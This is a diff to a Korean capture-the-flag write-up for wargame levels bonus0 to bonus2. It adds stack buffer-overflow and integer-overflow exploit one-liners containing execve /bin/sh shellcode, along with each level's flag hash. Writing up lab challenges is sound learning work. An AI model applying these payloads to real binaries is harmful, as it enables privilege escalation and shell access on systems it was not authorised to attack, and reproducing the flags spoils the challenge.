@@ -102,3 +102,33 @@ memcopy를 인자에서 받아서 실행하는데, vtable을 덮어써서 쉘코
 
 > bonus0 - f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
 
+버퍼 크기가 20인데 28글자씩 읽는 것을 시도한다.
+
+쉘코드는 스택 쓰레기 영역에 담았다.
+
+```bash
+cat <(python -c 'print "A" * 20 + "\n" + ("A"*4075) + "AAAAAAAAAAAAAA\x50\xe8\xff\xbfA\n" + ("B" * (0x200-20)) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + ("A"*3556),') - | ./bonus0
+```
+
+> bonus1 - cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+
+두 번째 인자로 들어온 문자열을 첫번째 인자를 atoi하여 나온 값 * 4한 만큼 복사하는데
+이때 atoi 결과값이 9보다 작은지 체크하는 부분이 있다.
+
+atoi는 signed, memcpy는 unsigned로 값을 취급한다는것을 이용해서 적당한 값을 넣는다
+
+```bash
+./bonus1 -2147483637 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFLOW
+```
+in 32bit -2147483637 * 4 = 44
+
+> bonus2 - 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+
+strncpy가 max length 보다 큰 문자열을 받을 때 맨 뒤
+null - term을 하지 않는다는 점을 이용해 인접한 문자열을 하나의 문자열처럼 만들 수 있다.
+
+```bash 
+LANG=fi ./bonus2 $(python -c 'print "AAAAAAAAAAAAAAAAAAAAAAAAAA1\xc0Ph//shh/bin\x89",') $(python -c 'print "\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x801\xc0@\xcd\x80BBBB\xe8\xf5\xff\xbf",')
+```
+
+> bonus3 - 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
